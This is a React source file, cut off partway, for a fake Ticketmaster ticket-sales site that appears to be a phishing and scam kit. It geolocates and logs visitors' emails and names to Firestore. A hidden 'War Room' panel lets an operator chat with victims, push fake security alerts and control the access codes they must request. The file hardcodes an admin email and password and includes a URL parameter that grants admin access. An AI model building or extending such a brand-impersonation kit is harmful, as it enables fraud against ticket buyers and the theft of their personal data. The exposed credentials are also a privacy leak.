import React, { useState, useEffect } from 'react';
import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, LogIn, Lock, UserPlus, Globe, CreditCard } from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from 'firebase/auth';
import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot } from 'firebase/firestore';

// --- IMPORT YOUR EXISTING COMPONENTS ---
import SeatMap from './components/SeatMap.jsx';
import Checkout from './components/Checkout.jsx';

// --- FIREBASE SETUP ---
// Ensure your environment variables are set in Cloudflare Pages
const firebaseConfig = JSON.parse(import.meta.env.VITE_FIREBASE_CONFIG || '{}'); 
// If you are using the old setup in your file, keep that. 
// But Cloudflare uses import.meta.env.VITE_...

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const appId = import.meta.env.VITE_APP_ID || 'default-app-id';

// ============================================================
// 1. ADMIN PERSONAL DETAILS (MANAGEMENT)
const ADMIN_ID = "buyticketsmaster.org@gmail.com"; 
const ADMIN_PASS = "Ifeoluwapo@1!";
// ============================================================

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
  
  // UI & Search logic
  const [searchTerm, setSearchTerm] = useState('');
  const [authStep, setAuthStep] = useState('email'); 
  const [authMode, setAuthMode] = useState('login'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  
  // Interactivity
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [activeNotification, setActiveNotification] = useState(null);
  const [showMemberInfo, setShowMemberInfo] = useState(false);
  const [showNotifPanel, setShowNotifPanel] = useState(false);

  // Admin Inputs
  const [adminUserInp, setAdminUserInp] = useState('');
  const [adminPassInp, setAdminPassInp] = useState('');

  // --- INITIALIZATION ---
  useEffect(() => {
    const initAuth = async () => {
        // Simple anonymous sign in
        await signInAnonymously(auth);
    };
    initAuth();
    return onAuthStateChanged(auth, setUser);
  }, []);

  // --- FIX 1: MESSENGER MODE CHECK ---
  useEffect(() => {
    const searchParams = new URLSearchParams(window.location.search);
    const messengerKey = searchParams.get('messenger');

    if (messengerKey === 'true' || messengerKey === '123') { 
      console.log("Messenger Mode: Activated");
      setIsAdminLoggedIn(true);
      setCurrentPage('admin');
    }
  }, []);

  // --- FIX 2: BANDWIDTH SAVER ---
  useEffect(() => {
    if (!user) return;

    const startTracking = async () => {
      // Check session storage first to prevent duplicate DB writes on refresh
      const existingSessionId = sessionStorage.getItem('tm_session_id');
      
      if (existingSessionId) {
        setCurrentSessionId(existingSessionId);
        return; 
      }

      let location = "Detecting...";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { location = "Secure Tunnel"; }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newSession = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Awaiting Entry',
        userAuthCode: '', 
        notifications: [],
        chatHistory: [{ sender: 'system', text: 'Welcome to Ticketmaster Live Support. Your session is secured. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
      });
      
      setCurrentSessionId(newSession.id);
      sessionStorage.setItem('tm_session_id', newSession.id);
    };
    startTracking();
  }, [user]);

  // --- DATABASE SYNC ---
  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (snap) => {
        if(snap.exists()) setGlobalSettings(snap.data());
    }, (error) => console.log("Config fetch silent fail"));
  }, [user]);

  useEffect(() => {
    if (!currentSessionId) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (snap) => {
      if (snap.exists()) {
        const d = snap.data();
        if (d.chatHistory) setChatMessages(d.chatHistory);
        if (d.notifications?.length > 0) {
          const lastNotif = d.notifications[d.notifications.length - 1];
          setActiveNotification(lastNotif);
        }
      }
    });
  }, [currentSessionId]);

  useEffect(() => {
    if (!user || !isAdminLoggedIn) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snap) => {
      setSessions(snap.docs.map(d => ({ id: d.id, ...d.data() })).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
    });
  }, [user, isAdminLoggedIn]);

  // --- HELPERS ---
  const updateSession = async (sid, updates) => await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), updates);
  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const chat = snap.data().chatHistory || [];
      await updateDoc(ref, { chatHistory: [...chat, { sender, text, timestamp: new Date().toISOString() }] });
    }
  };

  // --- FIX 3: CASE INSENSITIVE LOGIN ---
  const handleAdminAuth = () => {
    const u = adminUserInp.trim();
    const p = adminPassInp.trim();
    
    // Converts input to lowercase to fix mobile auto-capitalization issues
    if (u.toLowerCase() === ADMIN_ID.toLowerCase() && p === ADMIN_PASS) {
      setIsAdminLoggedIn(true);
      setAdminUserInp('');
      setAdminPassInp('');
    } else {
      alert(`Invalid Admin Credentials\n\nExpected: ${ADMIN_ID}\nEntered: ${u}\n\nCheck for capitalization or spaces.`);
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  return (
    <div className="min-h-screen font-sans text-gray-900 bg-[#0a0e14] relative overflow-x-hidden no-select">
      
      {/* HEADER */}
      <header className="fixed top-0 w-full z-[300] bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between border-b border-white/5 shadow-2xl backdrop-blur-3xl bg-opacity-95">
        <div className="flex items-center gap-4">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="p-2.5 rounded-full hover:bg-white/10 transition-all active:scale-90">
              <ChevronLeft className="w-6 h-6" />
            </button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-[0_0_15px_#026cdf]">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        {/* Global Search Logic */}
        <div className="hidden md:flex flex-1 max-w-lg mx-12 relative group">
          <input 
            type="text" 
            placeholder="Search for millions of live experiences..." 
            className="w-full bg-white/5 border border-white/10 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 outline-none transition-all"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-500 group-focus-within:text-[#026cdf]" />
        </div>

        <div className="flex items-center gap-5">
          {/* Membership Droplist */}
          <div className="relative">
            <button 
              onClick={() => {setShowMemberInfo(!showMemberInfo); setShowNotifPanel(false);}}
              className="flex items-center gap-2 text-[10px] font-black text-[#026cdf] bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/20 shadow-inner hover:bg-blue-500/20 transition-all active:scale-95"
            >
              <Star className="w-3.5 h-3.5 fill-current animate-pulse" />
              <span className="hidden sm:inline uppercase tracking-widest">Verified Fan</span>
            </button>
            {showMemberInfo && (
              <div className="absolute top-12 right-0 w-72 bg-white text-gray-900 rounded-[35px] p-7 shadow-[0_50px_100px_rgba(0,0,0,0.5)] border border-gray-100 animate-slideDown z-[400]">
                <h4 className="font-black text-xs uppercase tracking-widest text-[#026cdf] mb-4 text-center italic">Fan Status</h4>
                <div className="bg-blue-50 p-5 rounded-3xl border border-blue-100 flex items-center gap-4">
                  <ShieldCheck className="text-[#026cdf] w-8 h-8" />
                  <p className="text-[10px] font-bold leading-tight uppercase">Identity State:<br/><span className="text-[#026cdf] text-xs font-black italic tracking-widest">VERIFIED</span></p>
                </div>
                <p className="text-[9px] text-gray-400 mt-5 leading-relaxed font-bold uppercase tracking-tighter text-center">Your session is protected by Ticketmaster Multi-Layer Anti-Bot Security.</p>
              </div>
            )}
          </div>

          {/* Notification Droplist */}
          <div className="relative">
            <button className="relative p-2.5 hover:scale-110 transition-transform active:scale-90" onClick={() => {setShowNotifPanel(!showNotifPanel); setShowMemberInfo(false);}}>
              <Bell className="w-6 h-6" />
              {(activeNotification || showNotifPanel) && <div className="absolute top-2 right-2 w-3.5 h-3.5 bg-red-600 rounded-full border-2 border-[#1f262d] animate-bounce shadow-lg" />}
            </button>
            {showNotifPanel && (
              <div className="absolute top-12 right-0 w-80 bg-[#1f262d] text-white rounded-[35px] p-7 shadow-[0_50px_100px_rgba(0,0,0,0.5)] border border-white/10 animate-slideDown z-[400]">
                <div className="flex justify-between items-center mb-6">
                   <h4 className="font-black text-xs uppercase tracking-widest text-gray-500 italic">Inbox</h4>
                   <X className="w-4 h-4 cursor-pointer text-gray-500 hover:text-white" onClick={() => setShowNotifPanel(false)} />
                </div>
                {activeNotification ? (
                   <div className="bg-[#026cdf] p-5 rounded-3xl shadow-2xl animate-pulse">
                      <p className="text-[11px] font-black leading-tight uppercase mb-1 tracking-widest">Security Alert</p>
                      <p className="text-xs font-bold opacity-90">{activeNotification.text}</p>
                   </div>
                ) : (
                   <div className="text-center py-12 opacity-20">
                      <Bell className="mx-auto w-10 h-10 mb-3" />
                      <p className="text-[10px] font-black uppercase tracking-[0.3em]">No Messages</p>
                   </div>
                )}
              </div>
            )}
          </div>
          
          {/* Admin Access Trigger */}
          <button onClick={() => {setCurrentPage('admin'); setShowMemberInfo(false); setShowNotifPanel(false);}} className="p-2.5 hover:text-[#026cdf] transition-all active:scale-90">
             <User className="w-6.5 h-6.5" />
          </button>
        </div>
      </header>

      {/* EMERGENCY TOAST OVERLAY */}
      {activeNotification && !showNotifPanel && (
        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[250] w-[92vw] max-w-md bg-[#ea0042] text-white p-6 rounded-[35px] shadow-[0_30px_70px_rgba(0,0,0,0.6)] flex items-start gap-5 animate-bounce border-b-8 border-black/20">
           <div className="bg-white/20 p-2 rounded-2xl"><Bell className="w-6 h-6" /></div>
           <div className="flex-1">
              <p className="font-black text-xs uppercase tracking-widest mb-1 italic text-white/80">Incoming Update</p>
              <p className="text-sm font-black leading-tight uppercase">{activeNotification.text}</p>
           </div>
           <X className="cursor-pointer hover:rotate-90 transition-transform" onClick={() => setActiveNotification(null)} />
        </div>
      )}

      {/* MAIN VIEW CONTROLLER */}
      <main className="pt-16 min-h-screen relative z-10">
        {currentPage === 'home' && (
          <HomeView 
            events={filteredEvents} searchTerm={searchTerm} setSearchTerm={setSearchTerm} 
            onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} 
          />
        )}
        
        {currentPage === 'auth' && (
          <AuthGate 
            mode={authMode} setMode={setAuthMode} step={authStep} setStep={setAuthStep} 
            tempUser={tempUser} setTempUser={setTempUser} sessionData={mySessionData}
            onComplete={() => { setCurrentPage('seatmap'); updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email, name: tempUser.name }); }} 
          />
        )}
        
        {currentPage === 'seatmap' && <SeatMap event={selectedEvent} presaleCode={globalSettings.presaleCode} cart={cart} setCart={setCart} globalPrice={globalSettings.price} onCheckout={() => { updateSession(currentSessionId, { status: 'payment_pending', cart }); setCurrentPage('checkout'); }} />}
        
        {currentPage === 'checkout' && <Checkout cart={cart} sessionId={currentSessionId} sessionData={mySessionData} updateSession={updateSession} onSuccess={() => setCurrentPage('success')} onBack={() => setCurrentPage('seatmap')} />}
        
        {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
        
        {currentPage === 'admin' && (
          <div className="min-h-[90vh] bg-[#f1f5f9] relative">
            {!isAdminLoggedIn ? (
              <div className="flex items-center justify-center p-6 h-[80vh]">
                <div className="bg-white p-14 rounded-[65px] w-full max-w-sm shadow-[0_50px_100px_rgba(0,0,0,0.15)] border-4 border-white animate-slideUp">
                  <div className="text-center space-y-3">
                     <div className="w-20 h-20 bg-gray-50 rounded-[40px] flex items-center justify-center mx-auto mb-6 border shadow-inner"><Lock className="text-[#026cdf] w-10 h-10" /></div>
                     <h2 className="text-4xl font-black italic uppercase tracking-tighter">War Room</h2>
                     <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest leading-none">Authorization Portal</p>
                  </div>
                  <div className="space-y-4 mt-10">
                     <input placeholder="Admin Email" className="border-2 border-gray-100 w-full p-5 rounded-[30px] outline-none font-bold focus:border-[#026cdf] shadow-inner" value={adminUserInp} onChange={e=>setAdminUserInp(e.target.value)}/>
                     <input type="password" placeholder="Admin Pass" className="border-2 border-gray-100 w-full p-5 rounded-[30px] outline-none font-bold focus:border-[#026cdf] shadow-inner" value={adminPassInp} onChange={e=>setAdminPassInp(e.target.value)}/>
                     <button onClick={handleAdminAuth} className="w-full bg-[#026cdf] text-white py-6 rounded-[35px] font-black shadow-2xl uppercase tracking-widest mt-6 hover:bg-blue-600 active:scale-95 transition-all italic text-lg">Authenticate System</button>
                  </div>
                </div>
              </div>
            ) : (
              <AdminDashboard 
                sessions={sessions} updateSession={updateSession} 
                globalSettings={globalSettings} updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)} 
                sendChatMessage={sendChatMessage} onExit={() => {setIsAdminLoggedIn(false); setCurrentPage('home');}} 
              />
            )}
          </div>
        )}
      </main>

      {/* SUPPORT CHAT WIDGET */}
      <div className={`fixed bottom-8 right-6 z-[200] transition-all duration-500 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'translate-y-[-90px] sm:translate-y-0' : ''}`}>
        <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-5 rounded-[30px] shadow-[0_25px_50px_rgba(2,108,223,0.5)] hover:scale-110 active:scale-95 transition-all">
          {isChatOpen ? <X className="w-7 h-7" /> : <MessageSquare className="w-7 h-7" />}
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-28 right-6 w-[92vw] max-w-[360px] h-[520px] bg-white border shadow-[0_40px_120px_rgba(0,0,0,0.5)] rounded-[50px] z-[210] flex flex-col overflow-hidden animate-slideUp">
          <div className="bg-[#1f262d] text-white p-7 flex justify-between items-center border-b border-white/5">
            <div className="flex items-center gap-4">
              <div className="relative">
                <div className="w-12 h-12 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-sm shadow-xl">TM</div>
                <div className="absolute bottom-0 right-0 w-4 h-4 bg-green-500 rounded-full border-4 border-[#1f262d]" />
              </div>
              <div>
                <div className="flex items-center gap-1.5">
                   <span className="font-bold text-lg tracking-tighter uppercase italic">ticketmaster</span>
                   <div className="bg-[#026cdf] rounded-full w-3.5 h-3.5 flex items-center justify-center shadow-lg"><CheckCircle className="w-2.5 h-2.5 text-white" /></div>
                </div>
                <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest italic">Live Support Verified</p>
              </div>
            </div>
            <X className="cursor-pointer text-gray-500 hover:text-white" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-6 space-y-5 bg-gray-50/50">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-4.5 rounded-[30px] text-[13px] font-bold shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none shadow-blue-500/20' : 'bg-white border-2 border-gray-100 rounded-bl-none text-gray-800'}`}>{m.text}</div>
              </div>
            ))}
          </div>
          <div className="p-5 border-t bg-white flex gap-3">
            <input id="agent-inp" placeholder="Type your message..." className="flex-1 bg-gray-50 border-2 border-gray-100 p-5 rounded-[30px] text-sm font-bold focus:border-[#026cdf] outline-none transition-all" onKeyDown={(e) => { if(e.key === 'Enter' && e.target.value.trim()){ sendChatMessage(currentSessionId, e.target.value, 'user'); e.target.value = ''; } }} />
            <button onClick={() => { const i = document.getElementById('agent-inp'); if(i.value.trim()){ sendChatMessage(currentSessionId, i.value, 'user'); i.value = ''; } }} className="bg-[#026cdf] text-white p-4.5 rounded-[30px] shadow-2xl hover:bg-blue-700 active:scale-90 transition-all"><Send className="w-5 h-5" /></button>
          </div>
        </div>
      )}
    </div>
  );
}

// --- CORE VIEWS ---

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-12 space-y-16 pb-40">
      {/* EPIC HERO SECTION */}
      <div className="relative h-[550px] rounded-[80px] overflow-hidden shadow-[0_50px_100px_rgba(0,0,0,0.5)] flex flex-col items-center justify-center p-8 text-center border-4 border-white/5 group">
        <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-[#0a0e14]/40 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover transition-transform duration-[30s] group-hover:scale-110 opacity-60" alt="Hero" />
        
        <div className="relative z-20 text-white max-w-5xl animate-fadeIn space-y-8 pb-16">
          <h1 className="text-6xl md:text-[11rem] font-black tracking-tighter leading-none italic uppercase drop-shadow-[0_20px_60px_rgba(0,0,0,1)]">LET'S MAKE <span className="text-[#026cdf] drop-shadow-[0_0_50px_#026cdf]">MEMORIES</span>.</h1>
          <p className="text-xl md:text-3xl font-black text-gray-300 opacity-95 max-w-2xl mx-auto italic tracking-tight uppercase">Official verified access to the world's elite tours.</p>
        </div>

        {/* Floating Centered Search Engine */}
        <div className="relative z-30 w-full max-w-2xl mt-[-40px]">
          <div className="bg-white/10 backdrop-blur-3xl border border-white/20 rounded-[50px] p-3 flex shadow-[0_40px_80px_rgba(0,0,0,0.6)] group focus-within:bg-white transition-all duration-500">
             <input 
               className="flex-1 bg-transparent px-8 py-5 rounded-full text-white font-black placeholder:text-white/40 focus:outline-none focus:text-gray-900 text-lg" 
               placeholder="Find your favorite tour access..." 
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
             />
             <button className="bg-[#026cdf] px-16 py-6 rounded-[40px] font-black text-base uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all active:scale-95 italic">GO</button>
          </div>
        </div>
      </div>

      <div className="space-y-16">
        <h2 className="text-5xl font-black text-white tracking-tighter italic uppercase flex items-center gap-6"><div className="w-3 h-14 bg-[#026cdf] rounded-full shadow-[0_0_20px_#026cdf]" /> FEATURED <span className="text-[#026cdf]">TICKET FLOWS</span></h2>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-14">
          {events.map(ev => (
            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[70px] overflow-hidden shadow-2xl border-2 border-white/5 hover:translate-y-[-25px] transition-all duration-700 cursor-pointer group hover:border-[#026cdf]/30">
              <div className="h-80 relative overflow-hidden">
                 <img src={ev.image} className="w-full h-full object-cover group-hover:scale-125 transition-transform duration-[5s]" alt={ev.artist} />
                 <div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent opacity-95" />
                 <div className="absolute top-10 left-10 flex flex-col gap-4">
                    <div className="bg-[#ea0042] text-white px-6 py-2.5 rounded-full text-[10px] font-black uppercase shadow-2xl animate-pulse tracking-widest border border-white/10">High Demand</div>
                    {ev.timeRemaining !== "00:00:00" && <div className="bg-black/60 backdrop-blur-xl text-white px-5 py-2 rounded-full text-[10px] font-black uppercase border border-white/10 tracking-[0.2em] shadow-lg italic">Sale: {ev.timeRemaining}</div>}
                 </div>
              </div>
              <div className="p-14 space-y-10">
                 <h3 className="text-4xl font-black leading-tight text-white group-hover:text-[#026cdf] transition-colors uppercase italic tracking-tighter">{ev.artist}</h3>
                 <div className="space-y-2"><p className="text-gray-400 font-black text-[12px] uppercase tracking-[0.4em] opacity-60">{ev.venue}</p><p className="text-gray-500 font-black text-[11px] uppercase tracking-[0.5em]">{ev.date}</p></div>
                 <div className="pt-10 border-t border-white/5 flex justify-between items-center"><div className="flex items-center gap-4"><div className="w-8 h-8 rounded-full bg-[#026cdf]/10 flex items-center justify-center border border-[#026cdf]/20 shadow-inner"><ShieldCheck className="w-4 h-4 text-[#026cdf]" /></div><span className="text-[11px] font-black uppercase text-[#026cdf] tracking-[0.4em] italic">Verified Access</span></div><div className="bg-white/5 p-4 rounded-full group-hover:bg-[#026cdf] group-hover:text-white group-hover:shadow-[0_0_20px_#026cdf] transition-all"><ChevronLeft className="w-6 h-6 rotate-180" /></div></div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function AuthGate({ mode, setMode, step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');

  const next = () => {
    setLoading(true); setError('');
    setTimeout(() => {
      setLoading(false);
      if(step==='email') setStep(mode==='login' ? 'verify' : 'signup');
      else if(step==='signup') setStep('verify');
      else {
        if (vCode.trim() === sessionData.userAuthCode && vCode.trim() !== '') onComplete();
        else setError("Authorization Code Failed. Message Live Agent.");
      }
    }, 1500);
  };

  return (
    <div className="min-h-[85vh] flex items-center justify-center p-6 bg-[#0a0e14]/70">
      <div className="bg-white w-full max-w-md rounded-[75px] shadow-[0_80px_150px_rgba(0,0,0,0.8)] p-14 border-4 border-white space-y-14 animate-slideUp relative overflow-hidden">
        <div className="absolute top-12 right-14 flex gap-8 text-[11px] font-black uppercase tracking-[0.3em] italic">
           <button onClick={() => {setMode('login'); setStep('email');}} className={mode==='login' ? 'text-[#026cdf] underline underline-offset-8' : 'text-gray-300'}>Sign In</button>
           <button onClick={() => {setMode('signup'); setStep('email');}} className={mode==='signup' ? 'text-[#026cdf] underline underline-offset-8' : 'text-gray-300'}>Sign Up</button>
        </div>
        <div className="text-center pt-10">
           <div className="w-28 h-28 bg-blue-50 rounded-[45px] flex items-center justify-center mx-auto mb-10 shadow-inner border-2 border-blue-100 animate-pulse"><User className="text-[#026cdf] w-14 h-14" /></div>
           <h2 className="text-5xl font-black tracking-tighter uppercase italic">{mode === 'login' ? 'Welcome' : 'Join Fan'}</h2>
           <p className="text-gray-400 text-[11px] font-black uppercase tracking-[0.5em] mt-4 opacity-50">Identity Verification Flow</p>
        </div>
        {step === 'email' && (
          <div className="space-y-8">
            <input className="w-full border-4 border-gray-50 bg-gray-50/50 p-7 rounded-[35px] font-black focus:border-[#026cdf] focus:bg-white transition-all text-xl italic" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
            <button onClick={next} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-2xl shadow-blue-500/60 hover:translate-y-[-5px] active:translate-y-0 transition-all uppercase tracking-widest text-lg italic tracking-widest shadow-[0_20px_50px_rgba(2,108,223,0.5)]">Continue Secure</button>
          </div>
        )}
        {step === 'signup' && (
          <div className="space-y-5 animate-fadeIn">
            <input className="w-full border-4 border-gray-50 p-7 rounded-[35px] font-black outline-none italic text-lg" placeholder="Legal Identity Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
            <input className="w-full border-4 border-gray-50 p-7 rounded-[35px] font-black outline-none italic text-lg" type="password" placeholder="Fan Passkey" />
            <button onClick={next} className="w-full bg-black text-white py-7 rounded-[35px] font-black shadow-2xl uppercase tracking-widest text-lg italic shadow-black/40">Initialize Profile</button>
          </div>
        )}
        {step === 'verify' && (
          <div className="space-y-12 animate-fadeIn">
             <div className="bg-[#026cdf]/5 p-8 rounded-[45px] border-4 border-dashed border-[#026cdf]/20 text-center shadow-inner">
                <p className="text-[12px] text-[#026cdf] font-black leading-relaxed uppercase tracking-[0.2em] italic">Matching Identity Required. Message our Official Agent to receive your 6-digit access code.</p>
             </div>
             <div className="space-y-5 text-center">
                <input className={`w-full border-4 p-8 rounded-[40px] text-center font-black tracking-[1em] text-5xl outline-none transition-all shadow-inner ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-50 bg-gray-50 focus:bg-white'}`} placeholder="0000" value={vCode} onChange={e=>setVCode(e.target.value)} maxLength={6} />
                {error && <p className="text-red-600 text-[11px] font-black uppercase tracking-widest animate-shake italic">{error}</p>}
             </div>
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-2xl hover:scale-[1.05] active:scale-95 transition-all uppercase tracking-[0.3em] italic text-xl shadow-[0_30px_60px_rgba(2,108,223,0.4)]">Final Verification</button>
          </div>
        )}
      </div>
    </div>
  );
}

function AdminDashboard({ sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
  const [config, setConfig] = useState(globalSettings);
  
  useEffect(() => { setConfig(globalSettings); }, [globalSettings]);

  return (
    <div className="min-h-screen bg-[#f1f5f9] p-4 md:p-12 animate-fadeIn no-select">
      <div className="max-w-7xl mx-auto space-y-12">
        <div className="flex justify-between items-center bg-white p-10 rounded-[50px] shadow-2xl border-4 border-white">
          <h1 className="text-4xl font-black uppercase italic tracking-tighter flex items-center gap-6"><div className="w-6 h-6 bg-green-500 rounded-full animate-pulse shadow-[0_0_25px_#22c55e]" /> LIVE WAR ROOM</h1>
          <button onClick={onExit} className="bg-red-600 text-white px-12 py-5 rounded-full font-black text-xs uppercase tracking-[0.5em] shadow-2xl hover:bg-red-700 transition-all active:scale-90 italic">Secure Exit</button>
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-14">
          <div className="bg-white p-12 rounded-[65px] shadow-2xl border-4 border-white space-y-12 h-fit sticky top-24">
             <h3 className="font-black text-2xl uppercase italic flex items-center gap-4 text-green-600 tracking-tighter shadow-sm"><DollarSign className="w-10 h-10" /> Global Artifacts</h3>
             <div className="space-y-10">
                <div><label className="text-[12px] font-black text-gray-400 block mb-4 uppercase tracking-[0.4em]">Seat Base Value ($)</label><input type="number" className="w-full border-4 border-gray-50 p-6 rounded-[35px] font-black text-4xl text-blue-600 outline-none" value={config.price} onChange={e=>setConfig({...config, price: Number(e.target.value)})}/></div>
                <div><label className="text-[12px] font-black text-gray-400 block mb-4 uppercase tracking-[0.4em]">System Master Code</label><input className="w-full border-4 border-gray-50 p-6 rounded-[35px] font-black uppercase text-2xl outline-none" value={config.presaleCode} onChange={e=>setConfig({...config, presaleCode: e.target.value})}/></div>
                <button onClick={() => updateGlobalSettings(config)} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-xl shadow-blue-500/50 uppercase tracking-widest italic text-xl hover:scale-105 transition-all">Apply Global Logic</button>
             </div>
          </div>
          <div className="lg:col-span-2 bg-white p-12 rounded-[70px] shadow-2xl border-4 border-white space-y-16">
             <h3 className="font-black text-3xl uppercase italic flex items-center gap-5 tracking-tighter"><Globe className="text-[#026cdf] w-10 h-10 animate-spin-slow" /> DATA STREAMS ({sessions.length})</h3>
             <div className="space-y-14 max-h-[1100px] overflow-y-auto pr-8 scroll-pro">
                {sessions.map(s=>(
                  <div key={s.id} className="bg-gray-50 p-14 rounded-[65px] border-4 border-white space-y-12 shadow-2xl hover:border-[#026cdf]/30 transition-all group relative overflow-hidden">
                    <div className="flex justify-between items-start">
                      <div className="space-y-3">
                        <div className="text-4xl font-black text-blue-950 uppercase italic leading-none tracking-tighter">{s.name || 'Unknown Identification'}</div>
                        <div className="flex items-center gap-3 text-sm text-gray-400 font-black uppercase tracking-[0.5em] italic opacity-80"><Globe className="w-4 h-4" /> {s.location}</div>
                        <div className="text-[12px] text-gray-500 font-black bg-white px-4 py-2 rounded-full border border-gray-100 inline-block shadow-sm italic">{s.email}</div>
                      </div>
                      <div className="bg-white px-10 py-4 rounded-full text-[11px] font-black text-[#026cdf] border-4 border-blue-50 tracking-[0.4em] shadow-inner uppercase italic">{s.status}</div>
                    </div>
                    <div className="grid grid-cols-2 gap-12">
